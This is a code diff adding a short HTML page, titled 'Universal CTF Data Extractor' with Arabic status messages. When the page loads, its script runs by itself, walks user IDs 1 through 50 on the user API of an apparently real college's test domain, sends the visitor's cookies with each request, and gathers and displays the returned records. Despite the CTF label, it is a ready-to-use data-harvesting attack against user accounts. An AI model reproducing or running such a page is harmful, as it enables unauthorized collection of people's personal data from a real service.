@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Universal CTF Data Extractor</title>
+</head>
+<body>
+  <h2>📥 بدء جمع البيانات من الخادم</h2>
+  <pre id="output">يتم الفحص الآن...\n</pre>
+
+  <script>
+    const baseUrl = "https://myivy.test.ivytech.edu/api/user/";
+    const output = document.getElementById("output");
+
+    let allData = [];
+
+    async function collectEverything() {
+      for (let i = 1; i <= 50; i++) { // غيّر الرقم حسب الحاجة
+        const url = `${baseUrl}${i}`;
+        try {
+          const response = await fetch(url, { credentials: "include" });
+          const text = await response.text();
+
+          output.innerText += `\n🌐 [${i}] Response:\n${text}\n--------------------\n`;
+
+          // تخزين البيانات للعرض النهائي
+          allData.push({
+            id: i,
+            url: url,
+            content: text
+          });
+
+        } catch (error) {
+          output.innerText += `\n⚠️ [${i}] Error: ${error.message}\n`;
+        }
+      }
+
+      output.innerText += `\n✅ اكتمل الفحص! تم جمع ${allData.length} رد.\n`;
+    }
+
+    collectEverything();
+  </script>
+</body>
+</html>
